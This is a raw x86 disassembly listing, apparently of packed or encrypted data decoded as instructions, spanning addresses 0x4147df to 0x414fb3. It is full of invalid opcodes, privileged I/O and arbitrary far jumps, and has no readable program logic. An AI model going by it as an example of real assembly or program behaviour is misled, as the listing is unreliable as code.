  4147df:	lods   eax,DWORD PTR ds:[esi]
  4147e0:	cmc    
  4147e1:	stos   BYTE PTR es:[edi],al
  4147e2:	int3   
  4147e3:	add    eax,0x19353c7
  4147e8:	inc    esi
  4147e9:	fstp   DWORD PTR [esi-0x35619f1c]
  4147ef:	lds    ebp,FWORD PTR [ecx+0x7d3cc1e8]
  4147f5:	mov    edi,0xc59280e5
  4147fa:	jns    0x414862
  4147fc:	(bad)  
  4147fd:	fsubrp st(7),st
  4147ff:	inc    edx
  414800:	xchg   ebx,eax
  414801:	(bad)  
  414802:	imul   esi,DWORD PTR [edi],0x41
  414805:	ret    0x2e80
  414808:	jge    0x414804
  41480a:	xchg   ebx,eax
  41480b:	mov    DWORD PTR [ecx],esp
  41480d:	lock out 0xd5,eax
  414810:	and    BYTE PTR [eax+0x5f],cl
  414813:	xchg   DWORD PTR [esi-0x6c25494b],eax
  414819:	cmp    esp,edx
  41481b:	jmp    0x414836
  41481d:	(bad)  
  41481e:	xchg   ebx,eax
  41481f:	add    dl,BYTE PTR ds:0xf5eb4160
  414825:	sbb    eax,0xa0725aac
  41482a:	nop    DWORD PTR [edx-0x7e]
  41482e:	int3   
  41482f:	test   DWORD PTR ds:0xc8c1bc23,esp
  414835:	fst    st(4)
  414837:	cmp    BYTE PTR [ecx],bl
  414839:	jmp    0x26ebd4d
  41483e:	mov    ds:0x526e0c9d,al
  414843:	mov    edx,0x6fca7851
  414848:	mov    al,ds:0xd4770630
  41484d:	and    eax,0x5886e822
  414852:	ins    BYTE PTR es:[edi],dx
  414853:	add    cl,BYTE PTR [edi]
  414855:	pop    ebx
  414856:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414857:	shr    eax,0x82
  41485a:	jnp    0x4147f3
  41485c:	and    bh,BYTE PTR [ebp+0x20cbf04e]
  414862:	push   ss
  414863:	dec    edx
  414864:	gs pusha 
  414866:	and    ch,BYTE PTR [edi]
  414868:	dec    eax
  414869:	adc    esp,DWORD PTR [eax+0x69]
  41486c:	adc    al,ch
  41486e:	mov    al,ds:0x4427600b
  414873:	xchg   edi,eax
  414874:	inc    DWORD PTR [eax+esi*2]
  414877:	or     esi,eax
  414879:	pop    ss
  41487a:	repnz pop esi
  41487c:	xor    ecx,DWORD PTR [eax+0x17391650]
  414882:	pop    ebx
  414883:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414884:	(bad)  
  414886:	or     BYTE PTR [edx-0x1b7bad05],al
  41488c:	inc    esp
  41488d:	aam    0xde
  41488f:	callw  0xff31
  414893:	xor    al,0xac
  414895:	shl    DWORD PTR [esi-0x419dfe96],0xf3
  41489c:	xchg   esp,eax
  41489d:	xor    cl,BYTE PTR [edx]
  41489f:	pop    edx
  4148a0:	fsub   DWORD PTR [eax-0x44]
  4148a3:	gs push ecx
  4148a5:	(bad)  
  4148a7:	push   esp
  4148a8:	cmp    DWORD PTR [eax+esi*1-0x13],0x8df45ba3
  4148b0:	jecxz  0x414860
  4148b2:	push   ebx
  4148b3:	sbb    edx,edx
  4148b5:	xchg   ah,ch
  4148b7:	xlat   BYTE PTR ds:[ebx]
  4148b8:	test   esp,esp
  4148ba:	add    al,0x8f
  4148bc:	cwde   
  4148bd:	stos   DWORD PTR es:[edi],eax
  4148be:	call   0xb7ed:0x6232fc5c
  4148c5:	loopne 0x414923
  4148c7:	inc    esi
  4148c8:	out    0xec,eax
  4148ca:	jno    0x414902
  4148cc:	nop
  4148cd:	in     al,0xf9
  4148cf:	in     al,dx
  4148d0:	push   cs
  4148d1:	aam    0x54
  4148d3:	iret   
  4148d4:	dec    edi
  4148d5:	adc    eax,0xd7ddf812
  4148da:	ss test ecx,edx
  4148dd:	(bad)  
  4148df:	in     eax,0x85
  4148e1:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4148e3:	ds scas eax,DWORD PTR es:[edi]
  4148e5:	test   eax,0xb2b9
  4148ea:	fisttp QWORD PTR ds:0xb5c83022
  4148f0:	mov    al,ds:0xc17f2c9a
  4148f5:	mov    esp,DWORD PTR [edx-0x6]
  4148f8:	(bad)
  4148fc:	test   BYTE PTR [eax],dl
  4148fe:	je     0x41488a
  414900:	pop    edx
  414901:	in     al,dx
  414902:	(bad)  
  414904:	inc    ebx
  414905:	leave  
  414906:	push   ecx
  414907:	sub    al,0xed
  414909:	(bad)  
  41490a:	sbb    eax,0x9d4ad4ee
  41490f:	shr    ebp,0xf9
  414912:	or     eax,0x9de02529
  414917:	std    
  414918:	inc    edx
  414919:	repnz lock out 0x47,eax
  41491d:	or     ebx,DWORD PTR [eax+0x79]
  414920:	mov    BYTE PTR [ebx-0x7f],al
  414923:	repnz cmp ecx,DWORD PTR [esi-0x79]
  414927:	pop    edx
  414928:	test   al,0xd2
  41492a:	aad    0xbc
  41492c:	sbb    edi,ecx
  41492e:	daa    
  41492f:	leave  
  414930:	mov    esp,0xb724b3cc
  414935:	ror    DWORD PTR [edi-0x2eece039],cl
  41493b:	neg    DWORD PTR [ebx+0x7]
  41493e:	jle    0x4148c6
  414940:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414941:	int    0xaf
  414943:	fadd   st,st(4)
  414945:	outs   dx,DWORD PTR ds:[esi]
  414946:	stos   DWORD PTR es:[edi],eax
  414947:	or     al,ah
  414949:	ror    BYTE PTR [esi],0xa3
  41494c:	mov    dh,0x64
  41494e:	xchg   esp,eax
  41494f:	dec    BYTE PTR [eax+0xd]
  414952:	iret   
  414953:	(bad)  
  414955:	mov    ds:0x2ca3ff82,al
  41495a:	outs   dx,DWORD PTR ds:[esi]
  41495b:	out    0x5a,al
  41495d:	add    dl,bl
  41495f:	xchg   esp,eax
  414960:	inc    eax
  414961:	cwde   
  414962:	mov    bl,0xcc
  414964:	dec    eax
  414965:	pop    ss
  414966:	cmc    
  414967:	push   0xe8cdc05
  41496c:	and    DWORD PTR [edx],edi
  41496e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41496f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414970:	retf   
  414971:	sbb    eax,0x7c8590de
  414976:	pushf  
  414977:	sub    cl,BYTE PTR [eax+0x3c8ee6b3]
  41497d:	jp     0x414944
  41497f:	fadd   QWORD PTR [edi-0x27]
  414982:	arpl   WORD PTR [eax-0x9],sp
  414985:	adc    eax,0x7d239566
  41498a:	enter  0xf372,0xec
  41498e:	xchg   BYTE PTR [ebp+0x306a2f94],cl
  414994:	aad    0x92
  414996:	inc    ebp
  414997:	sbb    BYTE PTR [esi+0x0],ch
  41499a:	rcl    DWORD PTR [ebx+0x21],1
  41499d:	mov    esp,0x12c790f7
  4149a2:	sub    ah,BYTE PTR [ebx+ebx*4]
  4149a5:	dec    ebp
  4149a6:	sub    ch,bh
  4149a8:	cmc    
  4149a9:	xchg   esp,eax
  4149aa:	adc    eax,DWORD PTR ds:0x3eefd0a4
  4149b0:	xchg   ecx,eax
  4149b1:	sub    ecx,DWORD PTR [ecx]
  4149b3:	xor    ah,BYTE PTR ds:0x4502cacd
  4149b9:	loope  0x414996
  4149bb:	jne    0x4149ac
  4149bd:	sub    dh,0x41
  4149c0:	and    eax,0x56dabc7c
  4149c5:	jmp    0x54a02209
  4149ca:	adc    dl,al
  4149cc:	adc    al,0xe1
  4149ce:	addr16 (bad) 
  4149d0:	imul   edi,DWORD PTR [ebx],0xffffffa6
  4149d3:	pop    ds
  4149d4:	cwde   
  4149d5:	ss stos BYTE PTR es:[edi],al
  4149d7:	test   al,0xf6
  4149d9:	sub    esi,ebx
  4149db:	add    eax,0x33e94f22
  4149e0:	iret   
  4149e1:	add    BYTE PTR [esi+0x330dde1c],0xab
  4149e8:	xchg   esp,eax
  4149e9:	mov    esi,0xa537e10f
  4149ee:	mov    al,BYTE PTR [ebp+0x34]
  4149f1:	les    sp,DWORD PTR [edi+0x1]
  4149f5:	push   ss
  4149f6:	retf   
  4149f7:	test   eax,0x30dd585e
  4149fc:	xor    bh,BYTE PTR [eax-0x31]
  4149ff:	shl    edi,cl
  414a01:	pop    esi
  414a02:	push   cs
  414a03:	cmp    BYTE PTR [ecx+0x36],0x9b
  414a07:	fst    QWORD PTR [esi-0x41]
  414a0a:	xchg   bh,cl
  414a0c:	jnp    0x4149a5
  414a0e:	addr16 into 
  414a10:	arpl   WORD PTR [eax],bp
  414a12:	mov    dh,0xa1
  414a14:	xor    BYTE PTR [edx-0xf],al
  414a17:	mov    dl,BYTE PTR [ecx]
  414a19:	adc    al,0x55
  414a1b:	mov    ch,0x95
  414a1d:	inc    eax
  414a1e:	retf   
  414a1f:	arpl   WORD PTR [eax],si
  414a21:	(bad)  
  414a22:	mov    esp,0x68c13384
  414a27:	sbb    ebx,DWORD PTR [esi]
  414a29:	repnz cmp cl,BYTE PTR [eax+0x48e70312]
  414a30:	ror    BYTE PTR [ebp+edi*8-0x42],1
  414a34:	mov    ecx,0xe441a1ad
  414a39:	cmc    
  414a3a:	jo     0x414a69
  414a3c:	test   eax,0xe86c4320
  414a41:	push   ebx
  414a42:	add    dl,BYTE PTR [esi-0x60]
  414a45:	push   ss
  414a46:	not    esp
  414a48:	sbb    al,0xf0
  414a4a:	mov    bh,0x24
  414a4c:	adc    DWORD PTR [esi-0x3f623208],0x7302d419
  414a56:	dec    ebx
  414a57:	std    
  414a58:	retf   
  414a59:	popa   
  414a5a:	outs   dx,BYTE PTR ds:[esi]
  414a5b:	pop    esp
  414a5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a5d:	(bad)  
  414a5e:	and    ebp,ebx
  414a60:	call   0x2dfe72f7
  414a65:	sbb    eax,0x73fb11ba
  414a6a:	xor    eax,0xf1dc3030
  414a6f:	stc    
  414a70:	inc    esp
  414a71:	leave  
  414a72:	sbb    DWORD PTR [ebp+0x7f5a83c3],0x29
  414a79:	aas    
  414a7a:	stos   DWORD PTR es:[edi],eax
  414a7b:	retf   0xe17f
  414a7e:	test   edi,ebp
  414a80:	mov    WORD PTR [ecx],gs
  414a82:	jbe    0x414a82
  414a84:	(bad)  
  414a85:	out    0x24,eax
  414a87:	mov    bh,0x8e
  414a89:	in     al,0x9f
  414a8b:	mov    esi,0xb7afa591
  414a90:	or     DWORD PTR [ebx-0x6b],edx
  414a93:	test   BYTE PTR [ecx],0x21
  414a96:	mov    al,0xda
  414a98:	int    0x7f
  414a9a:	rcr    BYTE PTR [eax+0x57e0b3da],cl
  414aa0:	xlat   BYTE PTR ds:[ebx]
  414aa1:	jmp    0x6aaa:0xbc08362b
  414aa8:	dec    ebp
  414aa9:	mov    edx,0x9c8b08e0
  414aae:	ja     0x414b19
  414ab0:	sbb    esp,edx
  414ab2:	sbb    bh,ch
  414ab4:	adc    al,0xef
  414ab6:	sbb    edi,DWORD PTR ds:[edi-0x7d4849ae]
  414abd:	(bad)  
  414abe:	or     al,0x3
  414ac0:	scas   al,BYTE PTR es:[edi]
  414ac1:	jnp    0x414a79
  414ac3:	inc    esi
  414ac4:	push   edx
  414ac5:	xor    dl,BYTE PTR [esp-0x1f811917]
  414acc:	xchg   ebp,eax
  414acd:	rol    DWORD PTR [edi+0x2f8e32be],0x12
  414ad4:	inc    eax
  414ad5:	xchg   ebp,eax
  414ad6:	jnp    0x414b00
  414ad8:	cmp    DWORD PTR [edi],edx
  414ada:	xchg   DWORD PTR [edx-0x7a],edi
  414add:	outs   dx,BYTE PTR ds:[esi]
  414ade:	fdivr  QWORD PTR [edx]
  414ae0:	clc    
  414ae1:	or     edi,DWORD PTR [edi]
  414ae3:	inc    ebx
  414ae4:	pop    ds
  414ae5:	fcom   QWORD PTR [edx-0x7fbb403]
  414aeb:	scas   eax,DWORD PTR es:[edi]
  414aec:	or     eax,0x927c903d
  414af1:	clc    
  414af2:	dec    ecx
  414af3:	stc    
  414af4:	jnp    0x414ad3
  414af6:	pop    ecx
  414af7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414af8:	stos   BYTE PTR es:[edi],al
  414af9:	and    DWORD PTR [edi+eiz*2-0x7c2b032b],esp
  414b00:	enter  0x1d24,0x4a
  414b04:	push   ds
  414b05:	or     BYTE PTR [ebp*4+0x2fb6df5d],0x67
  414b0d:	inc    eax
  414b0e:	call   0xb18322af
  414b13:	jle    0x414b6c
  414b15:	fistp  QWORD PTR [esi+0x3c]
  414b18:	xlat   BYTE PTR ds:[ebx]
  414b19:	jle    0x414b69
  414b1b:	fs std 
  414b1d:	fwait
  414b1e:	or     dl,BYTE PTR [edx]
  414b20:	ds (bad) 
  414b22:	xor    eax,0x339ac0e
  414b27:	retf   
  414b28:	ss ins BYTE PTR es:[edi],dx
  414b2a:	jg     0x414bab
  414b2c:	xchg   al,ah
  414b2e:	inc    esp
  414b2f:	jns    0x414bac
  414b31:	retf   
  414b32:	rsqrtps xmm3,xmm5
  414b35:	cmp    esi,DWORD PTR [edi+edx*1]
  414b38:	fwait
  414b39:	jbe    0x414b56
  414b3b:	aad    0xc0
  414b3d:	scas   eax,DWORD PTR es:[edi]
  414b3e:	push   ss
  414b3f:	adc    BYTE PTR [ecx-0x3bf562c3],ch
  414b45:	ret    
  414b46:	fstp   st(4)
  414b48:	push   ds
  414b49:	mov    ch,0xf1
  414b4b:	mov    ecx,edi
  414b4d:	mov    ebp,DWORD PTR ds:0x3e5f1165
  414b53:	and    bl,BYTE PTR [eax-0x45bc16bc]
  414b59:	jmp    0x90c543e8
  414b5e:	sbb    BYTE PTR [eax-0x6c],0x61
  414b62:	test   eax,0x24ac23a8
  414b67:	cwde   
  414b68:	pop    DWORD PTR [ebp-0x4efd1c9b]
  414b6e:	xchg   edx,eax
  414b6f:	sbb    BYTE PTR [ecx],dl
  414b71:	push   eax
  414b72:	scas   eax,DWORD PTR es:[edi]
  414b73:	adc    eax,0x8b51cbd
  414b78:	outs   dx,BYTE PTR ds:[esi]
  414b79:	mov    ebp,0x99ad9e28
  414b7e:	inc    ebp
  414b7f:	iret   
  414b80:	or     al,0xdf
  414b82:	test   al,0x4
  414b84:	pop    esp
  414b85:	add    BYTE PTR [ecx+edx*1],cl
  414b88:	inc    eax
  414b89:	test   DWORD PTR [esp+edi*4],0xcbfa2720
  414b90:	xor    esp,DWORD PTR [ecx+eiz*4]
  414b93:	into   
  414b94:	jmp    FWORD PTR [edx]
  414b96:	pop    edi
  414b97:	or     eax,0xb41f2603
  414b9c:	shl    DWORD PTR [ebp+0x20cf8ddb],cl
  414ba2:	sub    ecx,DWORD PTR [edi-0x4ea6f2e6]
  414ba8:	mov    BYTE PTR [edi],ch
  414baa:	lds    edi,FWORD PTR [ecx-0x2fb17b35]
  414bb0:	leave  
  414bb1:	cmp    ebp,DWORD PTR [esi-0xd]
  414bb4:	mov    esi,DWORD PTR [ecx]
  414bb6:	xchg   ebp,eax
  414bb7:	add    eax,0xe5a0c845
  414bbc:	lahf   
  414bbd:	pop    ecx
  414bbe:	xor    BYTE PTR [edx-0x1a],ch
  414bc1:	sbb    eax,0xb202968e
  414bc6:	xor    ebx,edi
  414bc8:	out    0x31,al
  414bca:	inc    edx
  414bcb:	bound  ebp,QWORD PTR [edi]
  414bcd:	ret    
  414bce:	jne    0x414ba3
  414bd0:	jmp    0x414c07
  414bd2:	rcl    DWORD PTR [eax-0x6d854bba],0xaf
  414bd9:	dec    eax
  414bda:	ja     0x414c52
  414bdc:	idiv   esi
  414bde:	fcomp  DWORD PTR [eax-0x35cab12b]
  414be4:	mov    BYTE PTR [esi-0x6dc8c4af],0x64
  414beb:	mov    ebp,0x57ec90e6
  414bf0:	nop
  414bf1:	inc    ebp
  414bf2:	popa   
  414bf3:	cmp    edi,DWORD PTR [ecx-0xa]
  414bf6:	mov    esp,eax
  414bf8:	cmc    
  414bf9:	mov    ds:0x9d58edb2,al
  414bfe:	inc    eax
  414bff:	cld    
  414c00:	pusha  
  414c01:	repz ds xor eax,0xe17d499c
  414c08:	adc    al,0x31
  414c0a:	push   esp
  414c0b:	bound  edi,QWORD PTR [edx]
  414c0d:	loopne 0x414bdd
  414c0f:	in     eax,0x7e
  414c11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c12:	aaa    
  414c13:	mov    ebx,0x6b12daad
  414c18:	pushf  
  414c19:	cmc    
  414c1a:	add    cl,cl
  414c1c:	mov    cl,BYTE PTR [ebx-0x49a385af]
  414c22:	dec    edx
  414c23:	mov    eax,ds:0x2dea7048
  414c28:	sub    eax,esi
  414c2a:	js     0x414bcd
  414c2c:	pop    edx
  414c2d:	pop    eax
  414c2e:	add    DWORD PTR [esi-0x18],esp
  414c31:	cmp    al,0xdc
  414c33:	loop   0x414bca
  414c35:	sahf   
  414c36:	imul   eax,DWORD PTR [esi],0x1d3a0d71
  414c3c:	mov    edi,0x7f480b7f
  414c41:	adc    DWORD PTR [ebx],esp
  414c43:	mov    dl,0xd1
  414c45:	sbb    al,0x56
  414c47:	and    ecx,ebp
  414c49:	ss add eax,0xc01bcfde
  414c4f:	sub    dh,BYTE PTR [eax]
  414c51:	jp     0x414c5f
  414c53:	push   edi
  414c54:	cmp    al,0xd4
  414c56:	and    al,0x8
  414c59:	dec    esi
  414c5a:	cli    
  414c5b:	mov    al,ds:0x595e7f17
  414c60:	jecxz  0x414bf4
  414c62:	sbb    dh,BYTE PTR [ebx+0x4b]
  414c65:	jo     0x414c16
  414c67:	cld    
  414c68:	jno    0x414c9c
  414c6a:	repz in al,dx
  414c6c:	mov    esp,0xbfe2bef3
  414c71:	and    bl,BYTE PTR [eax]
  414c73:	or     eax,0x888f5802
  414c78:	mov    edx,0xd78ca4a8
  414c7d:	cmp    dh,bh
  414c7f:	retf   
  414c80:	adc    BYTE PTR [ecx],ch
  414c82:	(bad)  
  414c83:	jnp    0x414c05
  414c85:	pop    ss
  414c86:	outs   dx,BYTE PTR ds:[esi]
  414c87:	inc    esi
  414c88:	lods   eax,DWORD PTR ds:[esi]
  414c89:	mov    cs,WORD PTR [esp+edi*4+0x54f9a326]
  414c90:	dec    edi
  414c91:	int    0x1e
  414c93:	arpl   WORD PTR ds:0x56ea679d,sp
  414c99:	mov    ds:0xff2cae1f,eax
  414c9e:	inc    eax
  414c9f:	cmp    BYTE PTR [ebp-0x5],bh
  414ca2:	or     BYTE PTR [eax-0x48],bh
  414ca5:	xor    DWORD PTR ss:[eax],0x269e1325
  414cac:	sub    bh,dh
  414cae:	sbb    ebp,DWORD PTR [esp+esi*8-0x22]
  414cb2:	std    
  414cb3:	cli    
  414cb4:	lds    edx,FWORD PTR [ebp-0x6b982469]
  414cba:	add    eax,0xea3ba569
  414cbf:	fadd   DWORD PTR [esi+ecx*2+0x4788559e]
  414cc6:	mov    eax,ds:0x778728b
  414ccb:	nop
  414ccc:	or     eax,0x500b47e3
  414cd1:	fs call 0xaa53:0x25aba890
  414cd9:	or     al,0xb5
  414cdb:	push   esp
  414cdc:	(bad)  
  414cdd:	mul    ah
  414cdf:	push   esi
  414ce0:	mov    ch,0xf8
  414ce2:	nop
  414ce3:	or     eax,0x1e681dd9
  414ce8:	mov    esi,0x252e6d46
  414ced:	add    eax,0xa57fd3df
  414cf2:	dec    edx
  414cf3:	mov    BYTE PTR [edx+edi*4+0x587c3b66],bh
  414cfa:	adc    DWORD PTR [ebp+0x50aa4b71],esi
  414d00:	outs   dx,BYTE PTR ds:[esi]
  414d01:	aam    0x1e
  414d03:	loop   0x414c95
  414d05:	jmp    0x414cf4
  414d07:	push   0xf7e669a1
  414d0c:	xchg   ecx,eax
  414d0d:	(bad)  
  414d0e:	mov    esi,0x827316d8
  414d13:	pusha  
  414d14:	and    bh,BYTE PTR [edi+0x52]
  414d17:	sub    cl,al
  414d19:	and    esp,DWORD PTR [edi]
  414d1b:	call   0x5085d128
  414d20:	popf   
  414d21:	jmp    0xc9056a62
  414d26:	jg     0x414cdc
  414d28:	hlt    
  414d29:	sbb    BYTE PTR [eax],cl
  414d2b:	popf   
  414d2c:	sbb    ch,cl
  414d2e:	popa   
  414d2f:	add    eax,0x680b0c9d
  414d34:	sub    DWORD PTR [ebp+0x21b42e6d],0xffffffeb
  414d3b:	sbb    al,0x2b
  414d3d:	(bad)  
  414d3e:	and    BYTE PTR [ecx],al
  414d40:	adc    al,0xbb
  414d42:	(bad)  
  414d44:	mov    ch,0x4f
  414d46:	xchg   esi,eax
  414d47:	sub    edx,esi
  414d49:	stos   BYTE PTR es:[edi],al
  414d4a:	int    0x88
  414d4c:	call   0x71d7:0xa6e4ad12
  414d53:	std    
  414d54:	nop
  414d55:	mov    db6,esp
  414d58:	in     al,0x4
  414d5a:	mov    edx,0xac527211
  414d5f:	dec    ecx
  414d60:	pop    edx
  414d61:	push   edx
  414d62:	shl    DWORD PTR [edx],cl
  414d64:	cmp    ch,BYTE PTR [esi]
  414d66:	dec    esp
  414d67:	add    eax,0x50d085e6
  414d6c:	mov    ch,0x2b
  414d6e:	scas   eax,DWORD PTR es:[edi]
  414d6f:	retf   0x87af
  414d72:	dec    esi
  414d73:	rcl    DWORD PTR [edx-0x3d],1
  414d76:	ja     0x414d17
  414d78:	aas    
  414d79:	sbb    al,BYTE PTR [ebp-0x5aa15392]
  414d7f:	not    cl
  414d81:	stos   DWORD PTR es:[edi],eax
  414d82:	retf   
  414d83:	inc    esi
  414d84:	repz loopne 0x414d46
  414d87:	jle    0x414da2
  414d89:	js     0x414d77
  414d8b:	mul    BYTE PTR [edi]
  414d8d:	fdivr  st,st(0)
  414d8f:	imul   eax,ebx,0x9f56899c
  414d95:	push   ds
  414d96:	dec    edi
  414d97:	rcl    DWORD PTR [esi-0x53b892a2],0xd3
  414d9e:	pop    edx
  414d9f:	mov    ecx,0xc649a171
  414da4:	pop    ebp
  414da5:	mov    al,0x81
  414da7:	bound  edi,QWORD PTR [ebp-0x1bbf2b52]
  414dad:	add    cl,BYTE PTR ds:0x31656dd4
  414db3:	fld    QWORD PTR [esi+0x242abc48]
  414db9:	jno    0x414e2c
  414dbb:	ds cld 
  414dbd:	dec    eax
  414dbe:	push   ss
  414dbf:	dec    esi
  414dc0:	fwait
  414dc1:	sub    DWORD PTR [ecx-0x1],ebx
  414dc4:	les    esp,FWORD PTR [edx+0x69]
  414dc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dc8:	cli    
  414dc9:	push   es
  414dca:	xlat   BYTE PTR ds:[ebx]
  414dcb:	lds    edx,FWORD PTR gs:[ecx-0x1c]
  414dcf:	lods   al,BYTE PTR ds:[esi]
  414dd0:	adc    al,0xe
  414dd2:	mov    bl,0x90
  414dd4:	lods   eax,DWORD PTR ds:[esi]
  414dd5:	pop    edi
  414dd6:	in     eax,0xb6
  414dd8:	std    
  414dd9:	daa    
  414dda:	aam    0x28
  414ddc:	fldenv [ebp+0x14]
  414ddf:	dec    esi
  414de0:	clc    
  414de1:	(bad)  
  414de2:	call   0x43d36209
  414de7:	sub    eax,DWORD PTR [esi]
  414de9:	jb     0x414dd3
  414deb:	dec    edi
  414dec:	mul    eax
  414dee:	fst    QWORD PTR [ecx+0xf3cec4f]
  414df4:	mov    bl,0x81
  414df6:	push   0x5ff1ed38
  414dfb:	je     0x414dcf
  414dfd:	popa   
  414dfe:	inc    ebp
  414dff:	ror    BYTE PTR [esi],0x59
  414e02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e03:	seta   al
  414e06:	jo     0x414e22
  414e08:	pop    ebp
  414e09:	or     bl,BYTE PTR [esi-0x62]
  414e0c:	cmc    
  414e0d:	add    BYTE PTR [edi],cl
  414e0f:	jmp    0xd4d720aa
  414e14:	dec    ecx
  414e15:	xchg   edx,eax
  414e16:	mov    ecx,0xd89c1246
  414e1b:	loop   0x414e3d
  414e1d:	mov    eax,0xaa17bee9
  414e22:	pop    ebx
  414e23:	inc    esp
  414e24:	jge    0x414e4c
  414e26:	jg     0x414e58
  414e28:	daa    
  414e29:	inc    esi
  414e2a:	xor    DWORD PTR [ebx-0x4c],esi
  414e2d:	ret    
  414e2e:	sub    DWORD PTR [ebp+0x1e],ebx
  414e31:	inc    eax
  414e32:	sub    BYTE PTR [edi],bh
  414e34:	pop    edi
  414e35:	es cmc 
  414e37:	test   al,0x1
  414e39:	mov    eax,ds:0xfdfebf89
  414e3e:	pop    ebp
  414e3f:	cmp    al,0x23
  414e41:	inc    ebx
  414e42:	sub    al,0x8d
  414e44:	es scas al,BYTE PTR es:[edi]
  414e46:	sub    ch,BYTE PTR [edx]
  414e48:	aas    
  414e49:	repz pop es
  414e4b:	jnp    0x414df8
  414e4d:	sbb    eax,0xc3aef4df
  414e52:	pop    edi
  414e53:	cs pusha 
  414e55:	push   ss
  414e56:	sub    edx,DWORD PTR [esi]
  414e58:	pop    ebp
  414e59:	out    0xf9,eax
  414e5b:	jge    0x414eb8
  414e5d:	ret    
  414e5e:	pop    ebx
  414e5f:	and    bh,0x55
  414e62:	in     al,dx
  414e63:	ror    BYTE PTR [ebx-0xe566eea],1
  414e69:	jno    0x414e50
  414e6b:	cmp    BYTE PTR [ecx],al
  414e6d:	xchg   esi,eax
  414e6e:	add    dh,al
  414e70:	loope  0x414ec9
  414e72:	sti    
  414e73:	or     ah,cl
  414e75:	test   DWORD PTR [esi],ebx
  414e77:	lds    ebx,FWORD PTR [ebx]
  414e79:	xlat   BYTE PTR ds:[ebx]
  414e7a:	jb     0x414ef8
  414e7c:	call   0x7465:0x4027881a
  414e83:	cmp    al,0x1
  414e85:	pop    ebp
  414e86:	lock jp 0x414e24
  414e89:	adc    al,0xba
  414e8b:	test   eax,0x42acae1
  414e90:	cwde   
  414e91:	scas   eax,DWORD PTR es:[edi]
  414e92:	daa    
  414e93:	xor    edi,DWORD PTR [edx+0x41]
  414e96:	inc    ecx
  414e97:	sub    eax,DWORD PTR [ebx+0x3f7e562a]
  414e9d:	mov    esp,0x9ae20905
  414ea2:	ret    0x5c3d
  414ea5:	stos   BYTE PTR es:[edi],al
  414ea6:	adc    al,0x4e
  414ea8:	shl    DWORD PTR [edi+0x7e],cl
  414eab:	mov    bh,0x6f
  414ead:	mov    fs:0x39052f8b,eax
  414eb3:	jne    0x414f0c
  414eb5:	push   eax
  414eb6:	loop   0x414e63
  414eb8:	xchg   esp,eax
  414eb9:	or     dh,al
  414ebb:	daa    
  414ebc:	(bad)  
  414ebd:	mov    esi,0x32414fae
  414ec2:	(bad)  
  414ec3:	ins    BYTE PTR es:[edi],dx
  414ec4:	jecxz  0x414e86
  414ec6:	mov    eax,0xb26919ae
  414ecb:	xlat   BYTE PTR ds:[ebx]
  414ecc:	mov    ecx,ds
  414ece:	mov    edi,0xc1aff116
  414ed3:	sub    esi,DWORD PTR [ebx+0x9967e14]
  414ed9:	stos   BYTE PTR es:[edi],al
  414eda:	add    dh,dh
  414edc:	(bad)
  414ee0:	or     al,BYTE PTR [edi+0x22]
  414ee3:	push   ds
  414ee4:	jle    0x414f2a
  414ee6:	jmp    0x3cd8:0xd3baeda6
  414eed:	fisub  WORD PTR [esi-0xc5f951]
  414ef3:	icebp  
  414ef4:	out    0xd7,al
  414ef6:	repz cmc 
  414ef8:	sbb    edi,DWORD PTR [edi+eax*8-0x6]
  414efc:	mov    edi,0xebfa88c9
  414f01:	adc    BYTE PTR [edx+0x5a],dh
  414f04:	(bad)  
  414f05:	cmc    
  414f06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f07:	or     DWORD PTR [esi+0x112cc405],eax
  414f0d:	retf   0x54ab
  414f10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f11:	mov    ecx,0xdc7ce602
  414f16:	inc    eax
  414f17:	test   al,0x8f
  414f19:	enter  0xbbf7,0x1
  414f1d:	pop    es
  414f1e:	mov    edi,0x7ca74514
  414f23:	inc    edx
  414f24:	out    dx,al
  414f25:	js     0x414f1b
  414f27:	mov    eax,0x38164323
  414f2c:	push   eax
  414f2d:	dec    esp
  414f2e:	add    bl,BYTE PTR [edx-0x4d]
  414f31:	sbb    al,0x64
  414f33:	(bad)  
  414f34:	dec    esp
  414f35:	jmp    0x3fdc6181
  414f3a:	pop    edx
  414f3b:	jmp    0x1ff8:0x425f5a43
  414f42:	cdq    
  414f43:	adc    BYTE PTR [eax+0x16338ca6],ch
  414f49:	pop    ebx
  414f4a:	xor    esp,DWORD PTR [esi-0x7e]
  414f4d:	cmp    al,0x91
  414f4f:	ds mov dh,0xdc
  414f52:	cmp    DWORD PTR [ebx],esi
  414f54:	jmp    0xcbf5ac9d
  414f59:	and    eax,0x8820acc0
  414f5e:	into   
  414f5f:	push   ebp
  414f60:	shr    BYTE PTR ds:0xadb16147,1
  414f66:	daa    
  414f67:	aaa    
  414f68:	mov    ah,0xb
  414f6a:	and    eax,DWORD PTR [edx+ecx*8-0x752e1e7a]
  414f71:	fiadd  DWORD PTR [edx+0x18]
  414f74:	popf   
  414f75:	pop    ds
  414f76:	jle    0x414f31
  414f78:	and    ecx,DWORD PTR [esi+0x6667c781]
  414f7e:	pop    edx
  414f7f:	add    ebp,0x36
  414f82:	std    
  414f83:	jno    0x414f2c
  414f85:	adc    DWORD PTR [ebp-0x6ec2753b],0x13955ca6
  414f8f:	fsubr  st(0),st
  414f91:	lea    esi,[esi+eiz*4+0x4b]
  414f95:	call   0x9d3ad10
  414f9a:	jbe    0x414fda
  414f9c:	cdq    
  414f9d:	inc    ebp
  414f9e:	pop    edi
  414f9f:	inc    edi
  414fa0:	cs js  0x414fd9
  414fa3:	dec    edi
  414fa4:	js     0x414fe5
  414fa6:	pop    es
  414fa7:	mov    dl,0x1c
  414fa9:	push   ds
  414faa:	or     al,0x59
  414fac:	add    BYTE PTR [ecx-0x56],cl
  414faf:	fld    TBYTE PTR [esi+0x6b]
  414fb2:	dec    ebx
  414fb3:	push   edi
